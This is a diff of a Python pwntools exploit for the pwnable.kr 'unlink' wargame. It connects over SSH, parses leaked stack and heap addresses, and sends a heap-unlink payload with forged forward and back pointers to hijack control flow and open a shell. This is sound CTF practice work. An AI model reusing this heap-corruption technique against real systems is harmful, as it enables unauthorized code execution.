@@ -1,24 +1,38 @@
 from pwn import *
 
-sh = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
-p = sh.process('./unlink')
+def get_process(remote=False):
+    p = None
+    if remote:
+        sh = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
+        p = sh.process('./unlink')
+    else:
+        p = process('./unlink')
+    return p
+
+p = get_process(True)
 
 # Receive stack leak as hex and parse it
 p.recvuntil(b'stack address leak: ')
-stack_leak = int(p.recv(10).decode('unicode_escape'), 16)
+stack_leak = int(p.recvline().decode('unicode_escape').replace('0x', ''), 16)
+print(hex(stack_leak))
 
 # Receive heap leak as hex and do the same
 p.recvuntil(b'heap address leak: ')
-heap_leak = int(p.recv(9).decode('unicode_escape'), 16)
+heap_leak = int(p.recvline().decode('unicode_escape').replace('0x', ''), 16)
+print(hex(heap_leak))
 
-stack_return = 0x7FFFFFFF # Stack address to overwrite
 shell_function = 0x080484eb
+bk_offset = 4
 prev_chunk_size = 24
 chunk_size = 24
 
-payload += b'A'*8
-# Setup the fake chunk
-payload += p32(prev_chunk_size)
-payload += p32(chunk_size | 1) # Set previous chunk bit to 1
-payload += p32(stack_return - 4) # Forward pointer (Remove the offset when indexing FD->bk)
-payload += p32(shell_function) # Backwards pointer (shell function)
+# Store shell function address in the heap for next dereference
+payload = p32(shell_function)
+payload += b'A'*12
+# Change fd and bk pointers
+payload += p32(stack_leak + 16 - bk_offset) # Forward pointer (Remove the offset when indexing FD->bk)
+payload += p32(heap_leak + 8 + 4) # Backwards pointer (shell function)
+
+p.sendlineafter(b'get shell!', payload)
+
+p.interactive()
